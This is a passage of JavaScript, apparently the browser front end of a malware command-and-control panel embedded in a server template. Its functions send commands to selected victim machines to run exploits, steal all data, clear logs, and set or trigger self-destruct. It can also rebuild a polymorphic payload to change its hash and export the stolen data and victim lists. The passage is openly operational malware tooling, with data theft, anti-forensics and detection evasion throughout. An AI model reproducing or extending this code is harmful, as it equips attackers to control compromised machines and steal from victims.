        }}
        
        function exploit(method) {{
            if (!selectedVictim) {{
                alert('Select a source victim');
                return;
            }}
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'exploit',
                    params: {{method: method}}
                }})
            }});
        }}
        
        function polymorphicRebuild() {{
            fetch('/api/rebuild', {{
                method: 'POST'
            }})
            .then(r => r.json())
            .then(data => {{
                alert(`Payload rebuilt. New hash: ${{data.hash}}`);
            }});
        }}
        
        function clearLogs(type) {{
            if (!selectedVictim) {{
                alert('Select a victim');
                return;
            }}
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'clear_logs',
                    params: {{type: type}}
                }})
            }});
        }}
        
        function selfDestructNow() {{
            if (!confirm('WARNING: This will permanently remove the malware from selected victims. Continue?')) return;
            
            const victimIds = selectedVictim ? [selectedVictim] : [];
            
            fetch('/api/bulk_action', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_ids: victimIds,
                    action: 'self_destruct'
                }})
            }});
        }}
        
        function setSelfDestruct() {{
            const timer = parseInt(document.getElementById('selfDestructTimer').value);
            if (!timer) {{
                alert('Enter timer in seconds');
                return;
            }}
            
            if (!selectedVictim) {{
                alert('Select a victim');
                return;
            }}
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'self_destruct_timer',
                    params: {{seconds: timer}}
                }})
            }});
        }}
        
        function stealAllData() {{
            if (!selectedVictim) {{
                alert('Select a victim');
                return;
            }}
            
            fetch('/api/command', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    victim_id: selectedVictim,
                    command: 'steal_all_data'
                }})
            }});
        }}
        
        function exportData() {{
            window.location.href = '/api/export/all?format=json';
        }}
        
        function exportVictims(format) {{
            window.location.href = `/api/export/victims?format=${{format}}`;
